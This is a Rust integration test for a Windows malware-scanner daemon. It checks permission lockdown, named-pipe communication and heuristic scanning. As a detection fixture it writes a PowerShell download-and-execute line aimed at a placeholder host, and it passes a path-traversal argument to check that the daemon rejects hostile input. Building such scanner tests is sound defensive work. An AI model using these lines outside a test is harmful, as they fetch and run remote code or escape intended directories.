//! The service on Windows: console mode over a named pipe (Windows CI).
#![cfg(windows)]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::{Path, PathBuf};
use std::process::{Child, Command, Output};
use std::time::{Duration, Instant};

use warden_ipc::{Op, Reply};

/// Only SYSTEM and Administrators may modify `path` (what the daemon
/// requires of its configuration and scanner when elevated): owner
/// Administrators, and a protected DACL granting only SYSTEM and
/// Administrators. Checked with the daemon's own rule.
fn lock_down(path: &Path) {
    use warden_winsec::sddl;
    for args in [
        &["/setowner", "*S-1-5-32-544"][..],
        &[
            "/inheritance:r",
            "/grant:r",
            "*S-1-5-18:(F)",
            "*S-1-5-32-544:(F)",
        ],
    ] {
        let out = Command::new("icacls")
            .arg(path)
            .args(args)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "icacls {args:?}: {}",
            String::from_utf8_lossy(&out.stdout)
        );
    }
    // Remove any explicit entry icacls left for other principals.
    let text = warden_winsec::security_descriptor(path).unwrap();
    let d = sddl::parse(&text).unwrap();
    for sid in sddl::granted_to_others(&d, u32::MAX, &[sddl::SYSTEM, sddl::ADMINISTRATORS]) {
        let _ = Command::new("icacls")
            .arg(path)
            .args(["/remove:g", &format!("*{sid}")])
            .output();
    }
    let text = warden_winsec::security_descriptor(path).unwrap();
    sddl::check_write_restricted(
        &text,
        &[sddl::SYSTEM, sddl::ADMINISTRATORS, sddl::TRUSTED_INSTALLER],
    )
    .unwrap_or_else(|e| panic!("{}: {e}; descriptor {text}", path.display()));
}

struct Daemon {
    child: Child,
    pipe: String,
    config: PathBuf,
    _dir: tempfile::TempDir,
}

impl Daemon {
    fn start() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        let bin = d.join("bin");
        std::fs::create_dir(&bin).unwrap();
        let scanner = bin.join("abyssal-warden.exe");
        std::fs::copy(env!("CARGO_BIN_EXE_abyssal-warden"), &scanner).unwrap();
        lock_down(&scanner);
        let pipe = format!(r"\\.\pipe\aw-test-{}", std::process::id());
        let cfg = serde_json::json!({
            "socket": pipe,
            "state_dir": d.join("state"),
            "quarantine_store": d.join("q"),
            "scanner_binary": scanner,
        });
        let cfg_path = d.join("cfg.json");
        std::fs::write(&cfg_path, cfg.to_string()).unwrap();
        lock_down(&cfg_path);
        let child = Command::new(env!("CARGO_BIN_EXE_abyssal-wardend"))
            .arg("--config")
            .arg(&cfg_path)
            .env("ABYSSAL_WARDEN_SYSLOG_SOCKET", "")
            .spawn()
            .unwrap();
        let me = Self {
            child,
            pipe,
            config: cfg_path,
            _dir: dir,
        };
        let deadline = Instant::now() + Duration::from_secs(30);
        while warden_service::client::call(Path::new(&me.pipe), Op::Ping {}).is_err() {
            assert!(Instant::now() < deadline, "daemon did not start");
            std::thread::sleep(Duration::from_millis(100));
        }
        me
    }

    fn call(&self, op: Op) -> Reply {
        warden_service::client::call(Path::new(&self.pipe), op).unwrap()
    }

    fn cli(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_abyssal-warden"))
            .args(["service", "--socket", &self.pipe])
            .args(args)
            .output()
            .unwrap()
    }
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

#[test]
fn windows_service_scans_over_a_named_pipe() {
    let d = Daemon::start();
    let Reply::Status(s) = d.call(Op::Status {}) else {
        panic!("status")
    };
    assert!(s.caller.starts_with("S-1-"), "{}", s.caller);
    // A second instance with the same configuration cannot take the pipe.
    let second = Command::new(env!("CARGO_BIN_EXE_abyssal-wardend"))
        .arg("--config")
        .arg(&d.config)
        .output()
        .unwrap();
    assert_eq!(second.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&second.stderr).contains("in use"),
        "{}",
        String::from_utf8_lossy(&second.stderr)
    );

    let target = tempfile::tempdir().unwrap();
    std::fs::write(
        target.path().join("x.ps1"),
        "IEX (New-Object Net.WebClient).DownloadString('http://x/a')\r\n",
    )
    .unwrap();
    let out = d.cli(&[
        "scan",
        "--heuristics",
        "--wait",
        "--format",
        "json",
        target.path().to_str().unwrap(),
    ]);
    if s.caller_is_admin {
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert!(
            v["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|f| f["source"]["rule_id"] == "AW-HEU-030")
        );
        let Reply::Jobs { jobs } = d.call(Op::Jobs {}) else {
            panic!("jobs")
        };
        assert_eq!(jobs[0].owner, s.caller);
    } else {
        // Non-administrators scan with the CLI directly on Windows.
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("administrators"));
    }
    // Hostile input is rejected without harming the service.
    let bad = d.cli(&["quarantine", "delete", "../../x", "--yes"]);
    assert_eq!(bad.status.code(), Some(2));
    assert!(matches!(d.call(Op::Ping {}), Reply::Pong { .. }));
}
